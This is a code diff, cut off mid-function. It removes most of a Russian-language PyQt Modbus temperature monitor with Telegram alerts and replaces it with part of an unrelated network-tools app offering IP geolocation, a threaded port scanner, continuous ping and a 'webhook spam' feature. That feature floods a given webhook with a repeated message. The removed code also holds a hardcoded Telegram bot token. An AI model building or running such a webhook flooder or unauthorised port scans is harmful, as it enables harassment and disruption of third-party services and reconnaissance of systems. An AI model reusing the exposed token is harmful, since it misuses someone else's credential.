-        self.channel_names = [f"Канал {i+1}" for i in range(8)]
-        self.telegram_bot = None
-        self.threshold_alerts_sent = [False] * 8
-        
-        # Инициализация компонентов
-        self.timer = QTimer()
-        self.timer.timeout.connect(self.update_temperatures)
-        self.client = None
-        
-        # Настройка интерфейса
-        self.init_ui()
-        self.setup_logging()
-        self.load_config()
-        
-    def setup_logging(self):
-        self.log_handler = logging.StreamHandler()
-        self.log_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-        self.logger = logging.getLogger('TemperatureMonitor')
-        self.logger.setLevel(logging.DEBUG)
-        self.logger.addHandler(self.log_handler)
-        
-    def log_message(self, message, level=logging.INFO):
-        self.logger.log(level, message)
-        if hasattr(self, 'log_text_edit'):
-            self.log_text_edit.append(f"{datetime.now().strftime('%H:%M:%S.%f')[:-3]} - {message}")
-            cursor = self.log_text_edit.textCursor()
-            cursor.movePosition(cursor.End)
-            self.log_text_edit.setTextCursor(cursor)
-
-    def init_ui(self):
-        main_widget = QWidget()
-        self.setCentralWidget(main_widget)
-        main_layout = QVBoxLayout(main_widget)
-        main_layout.setContentsMargins(10, 10, 10, 10)
-        main_layout.setSpacing(15)
-        
-        # Стили
-        self.setStyleSheet("""
-            QMainWindow { background-color: #f5f5f5; }
-            QGroupBox { border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; padding-top: 15px; font-weight: bold; }
-            QPushButton { background-color: #4CAF50; color: white; border: none; padding: 8px 16px; border-radius: 4px; font-weight: bold; }
-            QPushButton:hover { background-color: #45a049; }
-            QPushButton:disabled { background-color: #cccccc; }
-            QPushButton#stopButton { background-color: #f44336; }
-            QPushButton#stopButton:hover { background-color: #d32f2f; }
-            QLineEdit, QComboBox, QSpinBox { padding: 5px; border: 1px solid #ddd; border-radius: 3px; }
-            QTextEdit { background-color: white; border: 1px solid #ddd; border-radius: 3px; padding: 5px; font-family: monospace; }
-        """)
-        
-        # Панель управления Modbus
-        control_group = QGroupBox("Настройки Modbus")
-        control_layout = QGridLayout()
-        
-        control_layout.addWidget(QLabel("COM порт:"), 0, 0)
-        self.port_combo = QComboBox()
-        self.port_combo.addItems([f"COM{i}" for i in range(1, 21)])
-        self.port_combo.setCurrentText(self.port)
-        control_layout.addWidget(self.port_combo, 0, 1)
-        
-        control_layout.addWidget(QLabel("Скорость (bps):"), 0, 2)
-        self.baudrate_spin = QSpinBox()
-        self.baudrate_spin.setRange(1200, 115200)
-        self.baudrate_spin.setValue(self.baudrate)
-        control_layout.addWidget(self.baudrate_spin, 0, 3)
-        
-        control_layout.addWidget(QLabel("Slave ID:"), 1, 0)
-        self.slave_spin = QSpinBox()
-        self.slave_spin.setRange(1, 247)
-        self.slave_spin.setValue(self.slave_id)
-        control_layout.addWidget(self.slave_spin, 1, 1)
-        
-        control_layout.addWidget(QLabel("Интервал (мс):"), 1, 2)
-        self.interval_spin = QSpinBox()
-        self.interval_spin.setRange(500, 10000)
-        self.interval_spin.setValue(self.update_interval)
-        self.interval_spin.valueChanged.connect(self.set_update_interval)
-        control_layout.addWidget(self.interval_spin, 1, 3)
-        
-        control_group.setLayout(control_layout)
-        main_layout.addWidget(control_group)
-        
-        # Вкладки
-        self.tabs = QTabWidget()
-        
-        # Вкладка с графиками
-        self.graph_tab = QWidget()
-        self.graph_tab_layout = QVBoxLayout(self.graph_tab)
-        self.figure = Figure(figsize=(10, 8), dpi=100)
-        self.canvas = FigureCanvas(self.figure)
-        self.graph_tab_layout.addWidget(self.canvas)
-        
-        self.axes = []
-        self.lines = []
-        for i in range(8):
-            ax = self.figure.add_subplot(4, 2, i+1)
-            line, = ax.plot([], [], label=f'Канал {i+1}', linewidth=2)
-            ax.set_title(f'Канал {i+1}', fontsize=10)
-            ax.set_ylabel('°C', fontsize=8)
-            ax.grid(True, linestyle='--', alpha=0.6)
-            ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
-            self.axes.append(ax)
-            self.lines.append(line)
             
-        self.figure.tight_layout()
-        self.tabs.addTab(self.graph_tab, "Графики")
-        
-        # Вкладка с текущими значениями
-        self.values_tab = QWidget()
-        self.values_tab_layout = QGridLayout(self.values_tab)
-        self.value_labels = []
-        for i in range(8):
-            frame = QFrame()
-            frame.setFrameShape(QFrame.StyledPanel)
-            frame_layout = QVBoxLayout(frame)
-            
-            title = QLabel(f"Канал {i+1}")
-            title.setFont(QFont('Arial', 10, QFont.Bold))
-            title.setAlignment(Qt.AlignCenter)
-            frame_layout.addWidget(title)
-            
-            label = QLabel("-- °C")
-            label.setAlignment(Qt.AlignCenter)
-            label.setFont(QFont('Arial', 14, QFont.Bold))
-            frame_layout.addWidget(label)
-            
-            self.value_labels.append(label)
-            self.values_tab_layout.addWidget(frame, i//4, i%4)
-        
-        self.tabs.addTab(self.values_tab, "Текущие значения")
-        
-        # Вкладка с настройками каналов
-        self.channels_tab = QWidget()
-        self.channels_tab_layout = QVBoxLayout(self.channels_tab)
-        
-        channels_group = QGroupBox("Настройки названий каналов")
-        channels_grid = QGridLayout()
-        
-        self.channel_name_edits = []
-        for i in range(8):
-            channels_grid.addWidget(QLabel(f"Канал {i+1}:"), i, 0)
-            edit = QLineEdit(f"Канал {i+1}")
-            edit.textChanged.connect(lambda text, idx=i: self.update_channel_name(idx, text))
-            self.channel_name_edits.append(edit)
-            channels_grid.addWidget(edit, i, 1)
-        
-        channels_group.setLayout(channels_grid)
-        self.channels_tab_layout.addWidget(channels_group)
-        
-        # Группа пороговых значений
-        threshold_group = QGroupBox("Уведомления при пороговой температуре")
-        threshold_layout = QGridLayout()
-        
-        self.threshold_checkboxes = []
-        self.threshold_spinboxes = []
-        
-        for i in range(8):
-            chk = QCheckBox(f"Канал {i+1}")
-            self.threshold_checkboxes.append(chk)
-            threshold_layout.addWidget(chk, i, 0)
-            
-            spin = QDoubleSpinBox()
-            spin.setRange(-50, 150)
-            spin.setValue(50)
-            spin.setSuffix(" °C")
-            self.threshold_spinboxes.append(spin)
-            threshold_layout.addWidget(spin, i, 1)
-        
-        threshold_group.setLayout(threshold_layout)
-        self.channels_tab_layout.addWidget(threshold_group)
-        self.channels_tab_layout.addStretch()
-        
-        self.tabs.addTab(self.channels_tab, "Настройки каналов")
-        
-        # Вкладка Telegram
-        self.telegram_tab = QWidget()
-        self.telegram_tab_layout = QVBoxLayout(self.telegram_tab)
-        
-        telegram_settings_group = QGroupBox("Настройки Telegram")
-        telegram_settings_layout = QGridLayout()
-        
-        self.telegram_enable = QCheckBox("Включить Telegram бота")
-        self.telegram_token = QLineEdit()
-        self.telegram_token.setPlaceholderText("Введите токен бота")
-        self.telegram_token.setText("8101843469:AAETKjUw7hx1mL3KrijQZBDCCB1fX7ser1o")
-        self.telegram_chat_id = QLineEdit()
-        self.telegram_chat_id.setPlaceholderText("Введите ID чата/группы")
-        
-        telegram_settings_layout.addWidget(QLabel("Токен бота:"), 0, 0)
-        telegram_settings_layout.addWidget(self.telegram_token, 0, 1)
-        telegram_settings_layout.addWidget(QLabel("ID чата:"), 1, 0)
-        telegram_settings_layout.addWidget(self.telegram_chat_id, 1, 1)
-        
-        self.telegram_test_name = QLineEdit()
-        self.telegram_test_name.setPlaceholderText("Название теста")
-        self.telegram_test_name.setText("Тест")
-        telegram_settings_layout.addWidget(QLabel("Название теста:"), 2, 0)
-        telegram_settings_layout.addWidget(self.telegram_test_name, 2, 1)
-        
-        self.telegram_interval = QSpinBox()
-        self.telegram_interval.setRange(10, 3600)
-        self.telegram_interval.setValue(60)
-        self.telegram_interval.setSuffix(" сек.")
-        telegram_settings_layout.addWidget(QLabel("Интервал отправки:"), 3, 0)
-        telegram_settings_layout.addWidget(self.telegram_interval, 3, 1)
-        
-        telegram_settings_group.setLayout(telegram_settings_layout)
-        self.telegram_tab_layout.addWidget(telegram_settings_group)
-        
-        telegram_buttons_layout = QHBoxLayout()
-        self.telegram_test_btn = QPushButton("Тест сообщение")
-        self.telegram_test_btn.clicked.connect(self.send_test_telegram_message)
-        telegram_buttons_layout.addWidget(self.telegram_test_btn)
-        
-        self.telegram_detect_btn = QPushButton("Определить chat_id")
-        self.telegram_detect_btn.clicked.connect(self.detect_chat_id)
-        telegram_buttons_layout.addWidget(self.telegram_detect_btn)
-        
-        self.telegram_tab_layout.addLayout(telegram_buttons_layout)
-        self.telegram_tab_layout.addStretch()
-        
-        self.tabs.addTab(self.telegram_tab, "Настройки Telegram")
-        
-        # Вкладка Excel
-        self.excel_tab = QWidget()
-        self.excel_tab_layout = QVBoxLayout(self.excel_tab)
-        
-        excel_settings_group = QGroupBox("Настройки Excel")
-        excel_settings_layout = QGridLayout()
-        
-        self.excel_auto_save_check = QCheckBox("Автоматическое сохранение в Excel")
-        self.excel_auto_save_check.stateChanged.connect(self.toggle_auto_save)
-        excel_settings_layout.addWidget(self.excel_auto_save_check, 0, 0, 1, 2)
-        
-        self.excel_file_edit = QLineEdit()
-        self.excel_file_edit.setText(self.excel_file)
-        excel_settings_layout.addWidget(QLabel("Файл Excel:"), 1, 0)
-        excel_settings_layout.addWidget(self.excel_file_edit, 1, 1)
-        
-        self.excel_file_btn = QPushButton("Выбрать файл")
-        self.excel_file_btn.clicked.connect(self.select_excel_file)
-        excel_settings_layout.addWidget(self.excel_file_btn, 2, 0, 1, 2)
-        
-        excel_settings_group.setLayout(excel_settings_layout)
-        self.excel_tab_layout.addWidget(excel_settings_group)
-        self.excel_tab_layout.addStretch()
-        
-        self.tabs.addTab(self.excel_tab, "Настройки Excel")
-        
-        # Вкладка логов
-        self.log_tab = QWidget()
-        self.log_tab_layout = QVBoxLayout(self.log_tab)
-        
-        log_group = QGroupBox("Логи программы")
-        log_layout = QVBoxLayout()
-        
-        self.log_text_edit = QTextEdit()
-        self.log_text_edit.setReadOnly(True)
-        self.log_text_edit.setLineWrapMode(QTextEdit.NoWrap)
-        
-        log_buttons_layout = QHBoxLayout()
-        self.clear_log_btn = QPushButton("Очистить логи")
-        self.clear_log_btn.clicked.connect(self.clear_logs)
-        log_buttons_layout.addWidget(self.clear_log_btn)
-        
-        self.save_log_btn = QPushButton("Сохранить логи")
-        self.save_log_btn.clicked.connect(self.save_logs)
-        log_buttons_layout.addWidget(self.save_log_btn)
-        
-        log_layout.addWidget(self.log_text_edit)
-        log_layout.addLayout(log_buttons_layout)
-        log_group.setLayout(log_layout)
-        self.log_tab_layout.addWidget(log_group)
-        
-        self.tabs.addTab(self.log_tab, "Логи")
-        
-        main_layout.addWidget(self.tabs)
-        
-        # Кнопки управления
-        button_layout = QHBoxLayout()
-        self.connect_btn = QPushButton("Подключиться")
-        self.connect_btn.clicked.connect(self.toggle_connection)
-        button_layout.addWidget(self.connect_btn)
-        
-        self.export_btn = QPushButton("Экспорт в Excel")
-        self.export_btn.clicked.connect(self.export_to_excel)
-        self.export_btn.setEnabled(False)
-        button_layout.addWidget(self.export_btn)
-        
-        self.clear_btn = QPushButton("Очистить данные")
-        self.clear_btn.clicked.connect(self.clear_data)
-        self.clear_btn.setEnabled(False)
-        button_layout.addWidget(self.clear_btn)
-        
-        main_layout.addLayout(button_layout)
-        
-        # Статус бар
-        self.status_bar = QStatusBar()
-        self.setStatusBar(self.status_bar)
-        self.status_bar.showMessage("Готов к подключению")
-
-    def set_update_interval(self, interval):
-        self.update_interval = max(500, min(interval, 10000))
-        if hasattr(self, 'timer') and self.timer.isActive():
-            self.timer.setInterval(self.update_interval)
-        self.log_message(f"Интервал обновления установлен: {self.update_interval} мс")
-
-    def update_channel_name(self, channel_idx, new_name):
-        self.channel_names[channel_idx] = new_name
-        self.axes[channel_idx].set_title(new_name, fontsize=10)
-        self.lines[channel_idx].set_label(new_name)
-        
-        if self.lines[channel_idx].get_label() and not self.lines[channel_idx].get_label().startswith('_'):
-            self.axes[channel_idx].legend()
-        
-        self.canvas.draw()
-        
-        if channel_idx < len(self.value_labels):
-            frame = self.value_labels[channel_idx].parent().parent()
-            if frame and frame.layout():
-                title_item = frame.layout().itemAt(0)
-                if title_item:
-                    title_label = title_item.widget()
-                    if isinstance(title_label, QLabel):
-                        title_label.setText(new_name)
-
-    def clear_logs(self):
-        self.log_text_edit.clear()
-        self.log_message("Логи очищены")
-
-    def save_logs(self):
-        file_name, _ = QFileDialog.getSaveFileName(
-            self, "Сохранить логи", 
-            "temperature_monitor_log.txt", 
-            "Text Files (*.txt)"
-        )
-        
-        if file_name:
+        def lookup_thread():
             try:
-                with open(file_name, 'w') as f:
-                    f.write(self.log_text_edit.toPlainText())
-                self.log_message(f"Логи сохранены в {file_name}")
-            except Exception as e:
-                self.log_message(f"Ошибка сохранения логов: {str(e)}", logging.ERROR)
-
-    def toggle_auto_save(self, state):
-        self.excel_auto_save = (state == Qt.Checked)
-        if self.excel_auto_save:
-            self.excel_file = self.excel_file_edit.text()
-            try:
-                self.excel_writer = pd.ExcelWriter(self.excel_file, engine='openpyxl')
-                self.log_message(f"Автосохранение включено. Файл: {self.excel_file}")
-            except Exception as e:
-                self.log_message(f"Ошибка открытия файла Excel: {str(e)}", logging.ERROR)
-                self.excel_auto_save_check.setChecked(False)
-        elif not self.excel_auto_save and hasattr(self, 'excel_writer') and self.excel_writer:
-            self.save_excel_data()
-            self.excel_writer = None
-            self.log_message("Автосохранение отключено")
-
-    def select_excel_file(self):
-        file_name, _ = QFileDialog.getSaveFileName(
-            self, "Выберите файл Excel", 
-            self.excel_file, 
-            "Excel Files (*.xlsx)"
-        )
-        if file_name:
-            self.excel_file_edit.setText(file_name)
-            self.excel_file = file_name
-            if self.excel_auto_save and hasattr(self, 'excel_writer') and self.excel_writer:
-                self.save_excel_data()
-                try:
-                    self.excel_writer = pd.ExcelWriter(self.excel_file, engine='openpyxl')
-                except Exception as e:
-                    self.log_message(f"Ошибка открытия файла Excel: {str(e)}", logging.ERROR)
-                    self.excel_auto_save_check.setChecked(False)
-
-    def save_excel_data(self):
-        if hasattr(self, 'excel_writer') and self.excel_writer and self.data_log:
-            try:
-                df = pd.DataFrame(self.data_log)
-                df.set_index('timestamp', inplace=True)
-                df.to_excel(self.excel_writer)
-                self.excel_writer.close()
-                self.excel_writer = pd.ExcelWriter(self.excel_file, engine='openpyxl')
-                self.log_message(f"Данные сохранены в {self.excel_file}")
-            except PermissionError:
-                self.log_message("Ошибка: Файл Excel занят другим процессом!", logging.ERROR)
-            except Exception as e:
-                self.log_message(f"Ошибка сохранения в Excel: {str(e)}", logging.ERROR)
-
-    def load_config(self):
-        if os.path.exists(self.config_file):
-            try:
-                with open(self.config_file, 'r') as f:
-                    config = json.load(f)
-                    self.telegram_token.setText(config.get('telegram_token', ''))
-                    self.telegram_chat_id.setText(config.get('telegram_chat_id', ''))
-                    self.telegram_enable.setChecked(config.get('telegram_enabled', False))
-                    self.telegram_test_name.setText(config.get('telegram_test_name', 'Тест B1B7'))
-                    self.telegram_interval.setValue(config.get('telegram_interval', 60))
-                    self.excel_auto_save_check.setChecked(config.get('excel_auto_save', False))
-                    self.excel_file_edit.setText(config.get('excel_file', 'temperature_data.xlsx'))
-                    self.excel_file = config.get('excel_file', 'temperature_data.xlsx')
-                    
-                    channel_names = config.get('channel_names', [])
-                    for i, name in enumerate(channel_names):
-                        if i < len(self.channel_name_edits):
-                            self.channel_name_edits[i].setText(name)
-                            self.channel_names[i] = name
-                            self.update_channel_name(i, name)
-                    
-                    threshold_enabled = config.get('threshold_enabled', [False]*8)
-                    threshold_values = config.get('threshold_values', [50.0]*8)
-                    
-                    for i in range(8):
-                        if i < len(self.threshold_checkboxes):
-                            self.threshold_checkboxes[i].setChecked(threshold_enabled[i])
-                        if i < len(self.threshold_spinboxes):
-                            self.threshold_spinboxes[i].setValue(threshold_values[i])
+                self.geo_results.delete("0.0", "end")
+                self.geo_results.insert("0.0", f"🔎 Fetching geolocation for {ip}...\n")
+                self.geo_results.insert("end", "-" * 50 + "\n")
                 
-                self.log_message("Конфигурация загружена")
-            except Exception as e:
-                self.log_message(f"Ошибка загрузки конфига: {e}", logging.ERROR)
-
-    def save_config(self):
-        config = {
-            'telegram_token': self.telegram_token.text(),
-            'telegram_chat_id': self.telegram_chat_id.text(),
-            'telegram_enabled': self.telegram_enable.isChecked(),
-            'telegram_test_name': self.telegram_test_name.text(),
-            'telegram_interval': self.telegram_interval.value(),
-            'excel_auto_save': self.excel_auto_save_check.isChecked(),
-            'excel_file': self.excel_file_edit.text(),
-            'channel_names': self.channel_names,
-            'threshold_enabled': [chk.isChecked() for chk in self.threshold_checkboxes],
-            'threshold_values': [spin.value() for spin in self.threshold_spinboxes]
-        }
-        with open(self.config_file, 'w') as f:
-            json.dump(config, f)
-        self.log_message("Конфигурация сохранена")
-
-    def detect_chat_id(self):
-        token = self.telegram_token.text()
-        if not token:
-            self.log_message("Введите токен бота!", logging.WARNING)
-            return
-            
-        try:
-            url = f"https://api.telegram.org/bot{token}/getUpdates"
-            response = requests.get(url).json()
-            
-            if response.get('ok'):
-                if len(response['result']) > 0:
-                    last_update = response['result'][-1]
-                    chat_id = last_update['message']['chat']['id']
-                    self.telegram_chat_id.setText(str(chat_id))
-                    self.log_message(f"Определен chat_id: {chat_id}")
-                else:
-                    self.log_message("Отправьте боту сообщение в чате!", logging.WARNING)
-            else:
-                self.log_message("Ошибка API Telegram", logging.ERROR)
-        except Exception as e:
-            self.log_message(f"Ошибка: {str(e)}", logging.ERROR)
-
-    def send_test_telegram_message(self):
-        token = self.telegram_token.text()
-        chat_id = self.telegram_chat_id.text()
-        
-        if not token or not chat_id:
-            self.log_message("Введите токен и chat_id!", logging.WARNING)
-            return
-            
-        try:
-            if not self.telegram_bot:
-                self.telegram_bot = TelegramBot(token, chat_id, self)
-                self.telegram_bot.run()
-            
-            self.telegram_bot.send_message("✅ Программа включена")
-            self.log_message("Тестовое сообщение отправлено")
-        except Exception as e:
-            self.log_message(f"Ошибка Telegram: {str(e)}", logging.ERROR)
-
-    def toggle_connection(self):
-        if self.timer.isActive():
-            self.stop_monitoring()
-        else:
-            self.start_monitoring()
-
-    def start_monitoring(self):
-        self.port = self.port_combo.currentText()
-        self.baudrate = self.baudrate_spin.value()
-        self.slave_id = self.slave_spin.value()
-        
-        self.log_message(f"Подключение к {self.port} (Slave ID: {self.slave_id})...")
-        
-        try:
-            self.client = ModbusSerialClient(
-                port=self.port,
-                baudrate=self.baudrate,
-                parity=self.parity,
-                stopbits=self.stopbits,
-                bytesize=self.bytesize,
-                timeout=self.timeout
-            )
-            
-            if not self.client.connect():
-                self.log_message("Не удалось подключиться к устройству!", logging.ERROR)
-                return
+                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
+                data = response.json()
                 
-            # Тестовый запрос для проверки связи
-            try:
-                test_response = self.client.read_input_registers(address=4, count=2, slave=self.slave_id)
-                if test_response.isError():
-                    self.log_message(f"Тестовый запрос не удался: {test_response}", logging.ERROR)
+                if data['status'] == 'success':
+                    result_text = f"""✅ Geolocation Results:
+
+IP/Domain: {data.get('query', 'N/A')}
+Country: {data.get('country', 'N/A')}
+Region: {data.get('regionName', 'N/A')}
+City: {data.get('city', 'N/A')}
+ZIP: {data.get('zip', 'N/A')}
+Latitude: {data.get('lat', 'N/A')}
+Longitude: {data.get('lon', 'N/A')}
+ISP: {data.get('isp', 'N/A')}
+Organization: {data.get('org', 'N/A')}
+AS: {data.get('as', 'N/A')}
+Timezone: {data.get('timezone', 'N/A')}
+"""
+                    self.geo_results.insert("end", result_text)
                 else:
-                    self.log_message(f"Тестовый запрос успешен: регистры {test_response.registers}", logging.DEBUG)
-            except Exception as test_error:
-                self.log_message(f"Ошибка тестового запроса: {str(test_error)}", logging.ERROR)
+                    self.geo_results.insert("end", "❌ Failed to get geolocation data\n")
+                    
+            except Exception as e:
+                self.geo_results.insert("end", f"❌ Error: {str(e)}\n")
+                
+        threading.Thread(target=lookup_thread, daemon=True).start()
+    
+    def clear_geo_results(self):
+        self.geo_results.delete("0.0", "end")
+        
+    def start_port_scan(self):
+        target = self.scan_target_entry.get().strip()
+        start_port = self.start_port_entry.get().strip()
+        end_port = self.end_port_entry.get().strip()
+        
+        if not all([target, start_port, end_port]):
+            messagebox.showerror("Error", "Please fill in all fields!")
+            return
             
-            self.log_message(f"Успешное подключение к {self.port} (Slave ID: {self.slave_id})")
+        try:
+            start_port = int(start_port)
+            end_port = int(end_port)
+            if start_port > end_port or start_port < 1 or end_port > 65535:
+                raise ValueError("Invalid port range")
+        except ValueError:
+            messagebox.showerror("Error", "Please enter valid port numbers (1-65535)!")
+            return
             
-            self.connect_btn.setText("Остановить")
-            self.connect_btn.setStyleSheet("background-color: #f44336;")
-            self.export_btn.setEnabled(True)
-            self.clear_btn.setEnabled(True)
-            
-            self.threshold_alerts_sent = [False] * 8
-            
-            if self.telegram_enable.isChecked():
-                token = self.telegram_token.text()
-                chat_id = self.telegram_chat_id.text()
-                if token and chat_id:
+        self.scan_stop_flag = False
+        self.scan_button.configure(state="disabled")
+        self.stop_scan_button.configure(state="normal")
+        self.scan_results.delete("0.0", "end")
+        
+        total_ports = end_port - start_port + 1
+        self.scan_progress.set(0)
+        
+        def scan_thread():
+            try:
+                target_ip = socket.gethostbyname(target)
+                self.scan_results.insert("0.0", f"🔌 Scanning {target} ({target_ip}) ports {start_port} ➡ {end_port}\n")
+                self.scan_results.insert("end", "-" * 50 + "\n")
+                
+                open_ports = []
+                scanned = 0
+                
+                def check_port(port):
+                    if self.scan_stop_flag:
+                        return False
                     try:
-                        self.telegram_bot = TelegramBot(token, chat_id, self)
-                        self.telegram_bot.run()
-                        msg = f"🔴 Начато измерение: {self.telegram_bot.measurement_name}"
-                        self.telegram_bot.send_message(msg)
-                        self.log_message("Telegram бот запущен")
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        result = sock.connect_ex((target_ip, port))
+                        sock.close()
+                        return result == 0
+                    except:
+                        return False
+                
+                with ThreadPoolExecutor(max_workers=50) as executor:
+                    futures = []
+                    for port in range(start_port, end_port + 1):
+                        if self.scan_stop_flag:
+                            break
+                        future = executor.submit(check_port, port)
+                        futures.append((port, future))
+                    
+                    for port, future in futures:
+                        if self.scan_stop_flag:
+                            break
+                        try:
+                            if future.result():
+                                open_ports.append(port)
+                                # Insert with green color for open ports
+                                self.scan_results.insert("end", f"Port {port} is OPEN\n", ("open",))
+                                self.scan_results.tag_config("open", foreground=self.success_color)
+                            else:
+                                # Insert with red color for closed ports
+                                self.scan_results.insert("end", f"Port {port} is CLOSED\n", ("closed",))
+                                self.scan_results.tag_config("closed", foreground=self.error_color)
+                        except:
+                            # Insert with red color for closed ports
+                            self.scan_results.insert("end", f"Port {port} is CLOSED\n", ("closed",))
+                            self.scan_results.tag_config("closed", foreground=self.error_color)
                         
-                        if str(chat_id).startswith('-'):
-                            self.last_group_message_id = self.get_last_message_id(token, chat_id)
+                        scanned += 1
+                        self.scan_progress.set(scanned / total_ports)
+                        self.scan_results.see("end")
+                        
+                if not self.scan_stop_flag:
+                    self.scan_results.insert("end", "-" * 50 + "\n")
+                    if open_ports:
+                        self.scan_results.insert("end", f"🎉 Found {len(open_ports)} open ports: {', '.join(map(str, open_ports))}\n")
+                    else:
+                        self.scan_results.insert("end", "🎉 No open ports found\n")
+                else:
+                    self.scan_results.insert("end", "⏹ Scan stopped by user\n")
+                    
+            except Exception as e:
+                self.scan_results.insert("end", f"❌ Error: {str(e)}\n")
+            finally:
+                self.scan_button.configure(state="normal")
+                self.stop_scan_button.configure(state="disabled")
+                
+        threading.Thread(target=scan_thread, daemon=True).start()
+        
+    def stop_port_scan(self):
+        self.scan_stop_flag = True
+    
+    def clear_scan_results(self):
+        self.scan_results.delete("0.0", "end")
+        
+    def start_webhook_spam(self):
+        webhook_url = self.webhook_entry.get().strip()
+        message = self.message_entry.get().strip()
+        count = self.count_entry.get().strip()
+        
+        if not all([webhook_url, message, count]):
+            messagebox.showerror("Error", "Please fill in all fields!")
+            return
+            
+        try:
+            count = int(count)
+            if count < 1:
+                raise ValueError("Count must be positive")
+        except ValueError:
+            messagebox.showerror("Error", "Please enter a valid number of messages!")
+            return
+            
+        self.spam_stop_flag = False
+        self.spam_button.configure(state="disabled")
+        self.stop_spam_button.configure(state="normal")
+        self.spam_results.delete("0.0", "end")
+        self.spam_progress.set(0)
+        
+        def spam_thread():
+            try:
+                self.spam_results.insert("0.0", f"📩 Starting webhook spam: {count} messages\n")
+                self.spam_results.insert("end", "-" * 50 + "\n")
+                
+                for i in range(1, count + 1):
+                    if self.spam_stop_flag:
+                        break
+                        
+                    try:
+                        payload = {"content": message}
+                        response = requests.post(webhook_url, json=payload, timeout=10)
+                        
+                        if response.status_code == 204:
+                            self.spam_results.insert("end", f"✅ Sent message {i}\n")
+                        else:
+                            self.spam_results.insert("end", f"❌ Failed to send message {i} (Status: {response.status_code})\n")
+                            
                     except Exception as e:
-                        self.log_message(f"Ошибка Telegram: {str(e)}", logging.ERROR)
-            
-            if self.excel_auto_save_check.isChecked():
-                self.toggle_auto_save(Qt.Checked)
-            
-            self.timer.start(self.update_interval)
-            self.log_message(f"Таймер запущен с интервалом {self.update_interval} мс")
-            self.save_config()
-            
-        except Exception as e:
-            self.log_message(f"Ошибка при запуске мониторинга: {str(e)}", logging.CRITICAL)
-            if hasattr(self, 'client') and self.client:
-                self.client.close()
-
-    def get_last_message_id(self, token, chat_id):
-        try:
-            url = f"https://api.telegram.org/bot{token}/getUpdates?chat_id={chat_id}"
-            response = requests.get(url).json()
-            if response.get('ok') and response.get('result'):
-                return response['result'][-1]['message']['message_id']
-        except:
-            return None
-
-    def stop_monitoring(self):
-        self.timer.stop()
-        if hasattr(self, 'client') and self.client and self.client.connected:
-            self.client.close()
+                        self.spam_results.insert("end", f"❌ Error sending message {i}: {str(e)}\n")
+                    
+                    self.spam_progress.set(i / count)
+                    self.spam_results.see("end")
+                    time.sleep(0.1)  # Rate limiting
+                    
+                if not self.spam_stop_flag:
+                    self.spam_results.insert("end", "-" * 50 + "\n")
+                    self.spam_results.insert("end", "🎉 Webhook spam completed!\n")
+                else:
+                    self.spam_results.insert("end", "⏹ Spam stopped by user\n")
+                    
+            except Exception as e:
+                self.spam_results.insert("end", f"❌ Error: {str(e)}\n")
+            finally:
+                self.spam_button.configure(state="normal")
+                self.stop_spam_button.configure(state="disabled")
+                
+        threading.Thread(target=spam_thread, daemon=True).start()
         
-        self.connect_btn.setText("Подключиться")
-        self.connect_btn.setStyleSheet("background-color: #4CAF50;")
+    def stop_webhook_spam(self):
+        self.spam_stop_flag = True
+    
+    def clear_spam_results(self):
+        self.spam_results.delete("0.0", "end")
         
-        if hasattr(self, 'telegram_bot') and self.telegram_bot:
-            self.telegram_bot.send_message(f"🟢 Измерение завершено: {self.telegram_bot.measurement_name}")
-            self.log_message("Telegram бот остановлен")
-        
-        if hasattr(self, 'excel_writer') and self.excel_writer and self.excel_auto_save:
-            self.save_excel_data()
-            self.excel_writer = None
-        
-        self.log_message("Мониторинг остановлен")
-        self.save_config()
-
-    def update_temperatures(self):
-        if not hasattr(self, 'client') or not self.client or not self.client.connected:
-            self.log_message("Ошибка: Modbus клиент не подключен!", logging.ERROR)
-            self.stop_monitoring()
+    def start_ping(self):
+        target = self.ping_entry.get().strip()
+        if not target:
+            messagebox.showerror("Error", "Please enter a target IP or domain!")
             return
             
-        temps = []
-        timestamp = datetime.now()
-        self.log_message(f"=== Начало чтения данных ({timestamp}) ===", logging.DEBUG)
+        self.ping_stop_flag = False
+        self.ping_button.configure(state="disabled")
+        self.stop_ping_button.configure(state="normal")
         
-        try:
-            for channel in range(8):
+        def ping_thread():
+            self.ping_results.delete("0.0", "end")
+            self.ping_results.insert("0.0", f"📡 Pinging {target} continuously...\n")
+            self.ping_results.insert("end", "-" * 50 + "\n")
+            
+            # Configure the tags for colored text
+            self.ping_results.tag_config("alive", foreground=self.success_color)  # Green for alive
+            self.ping_results.tag_config("down", foreground=self.error_color)     # Red for down
+            
+            while not self.ping_stop_flag:
                 try:
-                    address = 4 + channel * 6
-                    self.log_message(f"Чтение канала {channel+1} (адрес: {address}, Slave ID: {self.slave_id})...", logging.DEBUG)
+                    if platform.system().lower() == "windows":
+                        result = subprocess.run(['ping', '-n', '1', target], 
+                                              capture_output=True, text=True, timeout=5)
+                    else:
+                        result = subprocess.run(['ping', '-c', '1', target], 
+                                              capture_output=True, text=True, timeout=5)
                     
-                    response = self.client.read_input_registers(
-                        address=address,
-                        count=2,
-                        slave=self.slave_id
-                    )
-
-                    if response.isError():
-                        self.log_message(f"Ошибка Modbus для канала {channel+1}: {response}", logging.ERROR)
-                        temps.append(None)
-                        continue
-                        
-                    self.log_message(f"Канал {channel+1}: получены регистры {response.registers}", logging.DEBUG)
+                    timestamp = time.strftime("%H:%M:%S")
                     
-                    try:
-                        packed = pack('>HH', *response.registers)
-                        temperature = unpack('>f', packed)[0]
-                        temp = round(temperature, 2)
-                        temps.append(temp)
-                        self.log_message(f"Канал {channel+1}: температура = {temp}°C", logging.DEBUG)
+                    if result.returncode == 0:
+                        output = result.stdout
+                        if "time=" in output:
+                            time_part = output.split("time=")[1].split()[0]
+                            self.ping_results.insert("end", f"[{timestamp}] Alive - {time_part}\n", ("alive",))
+                        else:
+                            self.ping_results.insert("end", f"[{timestamp}] Alive - N/A ms\n", ("alive",))
+                    else:
+                        self.ping_results.insert("end", f"[{timestamp}] Network Down \n", ("down",))
                         
-                        if (self.threshold_checkboxes[channel].isChecked() and 
-                            temp > self.threshold_spinboxes[channel].value() and
-                            not self.threshold_alerts_sent[channel]):
-                            
-                            alert_msg = (f"⚠️ ПРЕВЫШЕНИЕ ТЕМПЕРАТУРЫ!\n"
-                                       f"Канал: {self.channel_names[channel]}\n"
-                                       f"Текущая температура: {temp} °C\n"
